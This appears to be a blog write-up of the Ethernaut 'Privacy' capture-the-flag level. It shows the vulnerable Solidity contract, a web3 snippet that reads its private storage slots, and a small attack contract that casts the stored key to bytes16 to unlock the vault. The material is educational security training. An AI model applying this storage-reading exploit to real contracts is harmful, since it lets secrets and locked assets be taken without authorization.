@@ -1,0 +1,72 @@
+<!doctype html><html lang=en><head><title>Privacy - Ethernaut :: DimitrisV SV1SJP</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="On this challenge, we have to unlock a vault again, but this is a more advanced one.
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms."><meta name=keywords content="linux"><meta name=robots content="noodp"><link rel=canonical href=/blockchain_writeups/privacy/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/assets/pink.css><link rel=apple-touch-icon href=/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=/favicon.ico><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content="DimitrisV"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Privacy - Ethernaut"><meta property="og:description" content="On this challenge, we have to unlock a vault again, but this is a more advanced one.
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms."><meta property="og:url" content="/blockchain_writeups/privacy/"><meta property="og:site_name" content="DimitrisV SV1SJP"><meta property="og:image" content="/favicon.ico"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2022-01-26 00:00:00 +0000 UTC"></head><body class=pink><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>DimitrisV SV1SJP</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about.html>About</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about.html>About</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=/blockchain_writeups/privacy/>Privacy - Ethernaut</a></h1><div class=post-meta><span class=post-date>2022-01-26</span>
+<span class=post-author>:: DimitrisV</span></div><div class=post-content><div><p>On this challenge, we have to unlock a vault again, but this is a more advanced one.</p><pre tabindex=0><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Privacy {
+
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(now);
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) public {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+
+  /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
+      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
+      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
+      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
+      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
+  */
+}
+</code></pre><p>So we can see some state variables and one byte32array. Our constructor parses the valuable data to the private data. The unlock function is our only point of interaction with this contract and here we just need to pass the right sequence of bytes16 to unlock the contract. As we already know, Ethereum blockchain is public, so we can spy on its storage by typing in console:</p><pre tabindex=0><code>let storage = []
+let callbackFNConstructor = (index) =&gt; (error, contractData) =&gt; {
+    storage[index]= contractData
+}
+
+
+for( var i = 0; i&lt;6; i++) { web3.eth.getStorageAt(contract.address, i, callbackFNConstructor(i)) }
+</code></pre><p>Running the code in the web console above will fetch us the first 6 storage variables defined in the target contract.Then, by accessing in storage array, we can see the 6 storage varaibles:</p><pre tabindex=0><code>storage
+(6) [&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;, &#39;0x0000000000000000000000000000000000000000000000000000000061e8582a&#39;, &#39;0x00000000000000000000000000000000000000000000000000000000582aff0a&#39;, &#39;0x6afa09c95f78aa0d4427b26b649a9e39764fb2e42aa80a1628d0af9465f2dfc6&#39;, &#39;0x5be1ffbd26ef932af6988e85bfa3168a66be9f53ad7a4036c81ec5578a9e12a6&#39;, &#39;0x3cb5971a348f1a4224f2175e48a929cc30b29ff44f5886d651e48fce1acdab53&#39;]
+</code></pre><p>The very first storage variable ends with &ldquo;001&rdquo;, so we expect to be a boolean variable. locked is the only boolean variable and obviously it is the first storage array data. We have the variable flattening = 10; and denomination=255. In hexadecimal, 10 is represented as 0a and 255 is represented as 255. We can find these in the third storage data.Due to storage optimization from Ethereum, we can find the in the same variable.</p><p>Storage optimization follows these very simple rules:</p><ol><li>Each index set aside for a storage variable allow 256bits.</li><li>Variables are indexed in the order they are defined in smart-contract.</li><li>If a variable consumes less than 256bits to be represented, leftover space will be shared with subsequent variables if they fit. Otherwise, they will be in the next storage variable.</li></ol><p>Also, it should be mentioned that constants do not use this type of storage. All other storage variables are from the byte32 array <code>data</code> . Therefore, we can see in unlock function that it is required that the key to be a byte16 and then compares it typecasts the data array[2] as a byte16 to aceed the comparision.
+We have just to take the first half of the bytes32 data and that’s going to be the new bytes16 type data. Calling the unlock method with that as an input parameter should unlock the vault. Let&rsquo;s create an attack contract.</p><pre tabindex=0><code>pragma solidity ^0.6.0;
+
+import &#39;./Privacy.sol&#39;;
+
+contract PrivacyAttack {
+     Privacy target;
+
+
+
+
+
+     constructor(address _targetAddr) public {
+         target = Privacy(_targetAddr);
+
+        
+     }
+
+     function unlock(bytes32 _slotValue) public {
+	 			// type casting the bytes32 to bytes16 
+         bytes16 key = bytes16(_slotValue);
+         target.unlock(key);
+     }
+    }
+</code></pre><p>Our contract address is:</p><pre tabindex=0><code>contract.address 
+</code></pre><p>Under the deployment of the contract, we add the contract&rsquo;s address to set it as a target in the counstructor. Finally, we can copy the storage data that stores the key and then give it as an input to our attack unlock function. Then, the contract will typecast the data from byte32 to byte16, it will keep only the first half of the bytes32 and send it to bytes16 type data. We unlocked the vault!!</p><hr><p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:</p><h2 id=smart-contract-security>Smart-Contract Security:<a href=#smart-contract-security class=hanchor arialabel=Anchor>&#8983;</a></h2><ul><li><a href=https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf>Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas</a></li></ul><ul><li><a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here</a></li></ul></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>Dimitris LinuxOS 2011-2022</span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=/assets/main.js></script>
+<script src=/assets/prism.js></script>
+<script src=/assets/languageSelector.js></script></div></body></html>
